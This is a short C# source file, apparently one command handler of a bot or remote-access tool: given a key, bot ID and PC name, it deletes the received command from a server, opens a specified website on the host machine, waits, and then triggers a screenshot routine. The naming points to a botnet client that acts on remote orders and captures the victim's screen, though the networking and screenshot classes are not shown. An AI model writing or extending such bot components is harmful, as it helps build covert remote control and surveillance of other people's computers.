using System.Threading;
using System.Diagnostics;

namespace ConsoleApp3
{
    internal class cmd_OpenWeb
    {
        public void OpenWeb(string website, string key, string bot_id, string pc_name)
        {
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);

            try
            {
                Process website_open = Process.Start(website);
            }
            catch
            {

            }

            Thread.Sleep(1500);

            cmd_GetScreenshot cmd_GetScreenshot = new cmd_GetScreenshot();
            cmd_GetScreenshot.GetScreenshot(key, bot_id, pc_name);
        }
    }

  

}
